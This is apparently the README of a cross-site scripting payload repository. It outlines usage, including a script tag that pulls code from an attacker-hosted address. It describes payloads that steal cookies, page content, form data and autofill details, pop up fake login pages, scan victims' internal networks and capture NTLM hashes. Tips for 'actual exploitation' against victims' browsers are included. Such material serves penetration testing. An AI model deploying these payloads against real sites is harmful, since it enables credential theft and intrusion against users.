# xss_payloads

Payloads for practical exploitation of cross site scripting.

## Usage

1. Find XSS vuln in your app
2. Get PoC exploit: alert(1) etc
3. Host these payloads somewhere
4. Use vuln to pull one of these payloads into the app `<script src="http://attackerip/file.js"></script>`
5. Profit

## js vs php files

Some of the files are plain JavaScript .js files, others are PHP scripts which serve JavaScript when rendered in order to do some more complex stuff. Make sure you have a PHP interpreter running on your web server of choice to get these to work `</obvious>`

## Common Problems

* You can't serve these over HTTP if your app is running on HTTPS. You'll need to serve them over HTTPS
* If you're running these over HTTPS for actual exploitation rather than a PoC, you'll need a proper trusted TLS cert (Let's Encrypt CA, for example) otherwise victim's browsers won't fetch the files at all. If it's for a PoC you can just temporarily trust your self signed cert.
* Hit F12 and view the debug console for any information about why a particular script might not work

## Payloads

### apache_httponly_bypass.js

Uses an excessively large cookie to exploit CVE-2012-0053 and extract HTTPOnly cookie values from the response.

### contentstealer.php

Steal the content of the current page, a specific element or another page within the same origin as the exploited web app.

### cookiestealer.php

Steal cookies from the site.

### formjacker.php 

Man-in-the-middle all forms on the current page and also exploit browser autofill functionality in order to steal personal information.

### formsubmitter.php

Grab a page from somewhere within the same origin, fill in a form on it and then submit that form.

### local_network_scan.php

Get the internal IP address of a victim and then have them do a TCP port scan of common ports on the /24 of that internal IP address.

### loginpage.php

Pop up a login page which sends the entered credentials back to this URL.

### recon.php ###

Passes back information about where it was executed:

 - page URL
 - script URL
 - user's IP address
 - Page content
 - Any non HttpOnly cookies present
 - User agent string

And then logs it all into either a file or a database. Great for when a collaborator alert is generated asynchronously and you need more info about where execution is occuring.

### unc_hashstealer.php

Fire up Responder.py on the same host as this script and then inject this payload. All links on the injected page will be turned into UNC paths to the same host.
